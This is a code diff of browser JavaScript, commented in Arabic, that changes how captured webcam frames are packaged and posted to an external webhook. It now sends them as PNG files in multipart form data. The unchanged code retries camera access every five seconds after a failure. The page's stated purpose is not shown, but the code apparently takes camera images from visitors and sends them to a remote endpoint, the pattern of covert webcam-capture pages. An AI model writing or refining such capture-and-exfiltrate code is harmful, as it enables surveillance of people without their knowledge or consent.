@@ -69,7 +69,6 @@
         
       } catch (err) {
         console.error('[Camera Error]', err);
-        // إعادة المحاولة بعد 5 ثواني إذا فشل الإذن
         setTimeout(startCameraAndCapture, 5000);
       }
     }
@@ -81,30 +80,26 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // تحويل إلى Base64 PNG
-        const base64Image = canvas.toDataURL('image/png');
+        // تحويل Canvas إلى Blob (ملف PNG حقيقي)
+        canvas.toBlob((blob) => {
+          sendToWebhook(blob);
+        }, 'image/png');
         
-        // إرسال إلى Webhook
-        sendToWebhook(base64Image);
       } catch (err) {
         console.error('[Capture Error]', err);
       }
     }
 
-    async function sendToWebhook(imageDataUrl) {
-      const payload = {
-        image_data: imageDataUrl,
-        timestamp: new Date().toISOString(),
-        type: 'camera_capture'
-      };
+    async function sendToWebhook(imageBlob) {
+      // إنشاء FormData لإرسال الملف كـ multipart/form-data
+      const formData = new FormData();
+      formData.append('file', imageBlob, `capture_${Date.now()}.png`);
+      formData.append('timestamp', new Date().toISOString());
 
       try {
         await fetch(WEBHOOK_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(payload)
+          body: formData
         });
       } catch (err) {
         console.error('[Send Error]', err);
